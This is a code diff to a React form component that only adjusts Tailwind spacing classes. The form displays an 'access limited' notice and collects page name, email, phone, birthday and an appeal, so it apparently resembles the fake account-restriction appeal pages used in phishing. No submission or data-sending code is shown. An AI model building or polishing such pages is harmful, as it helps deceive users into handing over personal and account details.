@@ -319,8 +319,8 @@ const Home = () => {
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
@@ -335,7 +335,8 @@ const Home = () => {
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
@@ -350,7 +351,8 @@ const Home = () => {
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
@@ -370,7 +372,8 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
@@ -408,7 +411,7 @@ const Home = () => {
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            <div className='flex flex-col gap-1 sm:gap-2'>
+                            <div className='flex flex-col gap-1'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
@@ -425,7 +428,7 @@ const Home = () => {
                             </div>
 
                             <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-2'
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-1'
                                 onClick={handleSubmit}
                             >
                                 {translatedTexts.submit}
